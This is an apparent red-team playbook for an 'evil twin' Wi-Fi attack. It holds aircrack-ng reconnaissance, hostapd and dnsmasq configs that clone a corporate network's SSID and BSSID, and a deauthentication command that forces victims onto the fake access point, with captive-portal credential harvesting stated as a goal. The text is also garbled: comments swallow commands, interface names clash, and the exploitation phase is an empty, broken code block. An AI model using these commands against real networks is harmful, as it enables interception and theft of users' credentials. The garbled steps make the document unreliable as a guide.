# Rogue Access Point (Evil Twin)

## When to Use
- When conducting physical Red Team operations or precise Wireless Penetration Tests to validate if corporate employees will connect to untrusted networks (e.g., verifying Guest network isolation or testing Security Awareness).
- To aggressively intercept wireless network traffic when standard passive sniffing (monitor mode) yields only encrypted WPA2/WPA3 packets, which require offline cracking.
- To harvest corporate credentials directly from users via sophisticated Captive Portal phishing campaigns mimicking the target organization's authentic login page.


## Prerequisites
- Wireless adapter supporting monitor mode and packet injection (e.g., Alfa AWUS036ACH)
- Kali Linux or similar distribution with aircrack-ng suite installed
- Physical proximity to the target wireless network
- Authorization to test the target wireless infrastructure

## Workflow

### Phase 1: Reconnaissance (The Setup)

```bash
# Concept: To clone a network 1. Start Interface airmon-ng start wlan1

# 2. Sniff airodump-ng wlan1mon

# Target BSSID: 00:11:22:33:44:55
# Target SSID: "Corporate_Private"
# Target Channel: 6
```

### Phase 2: Building the Evil Twin

```bash
# Concept: We must 1. Configure Hostapd # cat <<EOF > hostapd.conf
interface=wlan1mon
ssid=Corporate_Private
bssid=00:11:22:33:44:55
hw_mode=g
channel=6
EOF

# 2. Configure # cat <<EOF > dnsmasq.conf
interface=wlan1mon
dhcp-range=192.168.1.10,192.168.1.100,8h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# 3. Start hostapd hostapd.conf &
dnsmasq -C dnsmasq.conf -d &
```

### Phase 3: The Forced Migration (Deauthentication)

```bash
# Send aireplay-ng --deauth 100 -a 00:11:22:33:44:55 -c [VICTIM_MAC] wlan2mon
```

### Phase 4: Exploitation (Captive Portal / MitM)

```bash
# ```
